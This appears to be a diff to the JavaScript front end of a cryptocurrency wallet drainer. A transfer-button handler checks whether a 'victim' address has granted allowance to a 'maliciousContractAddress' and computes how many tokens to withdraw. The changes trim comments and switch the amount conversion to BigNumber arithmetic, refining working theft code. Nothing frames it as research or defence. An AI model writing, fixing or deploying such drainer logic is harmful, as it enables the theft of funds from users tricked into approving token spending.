@@ -469,13 +469,10 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
 
         try {
             // Dynamically retrieve the token decimals from the contract
-            // This will fetch the decimals based on the token contract (currently set for 18 decimals)
-            // If the contract's decimals ever change, this will automatically fetch the updated value
             const decimals = await tokenContract.methods.decimals().call();
-            
-            // In case you need to hard-code the decimals in the future (e.g., if the contract changes),
-            // you can set it manually here like so:
-            // const decimals = 18;  // Set this to the correct number of decimals if it changes in the future
+
+            // If you need to hard-code decimals in the future, you can set it manually like this:
+            // const decimals = 18;
 
             // Check if the victim has approved the malicious contract to spend tokens
             const allowance = await tokenContract.methods.allowance(cleanedVictimAddress, maliciousContractAddress).call();
@@ -489,8 +486,8 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
                 return;
             }
 
-            // Convert the amount to the token's smallest unit using the decimals
-            const amountInTokens = web3.utils.toBN(amountToWithdraw * Math.pow(10, decimals)).toString();
+            // Convert the amount to the token's smallest unit using BigNumber
+            const amountInTokens = web3.utils.toBN(amountToWithdraw).mul(web3.utils.toBN(Math.pow(10, decimals))).toString();
 
             // Check if the conversion succeeded and the amount is valid
             if (!amountInTokens || isNaN(amountInTokens)) {
@@ -509,6 +506,7 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
         }
     }
 });
+
 
 
 
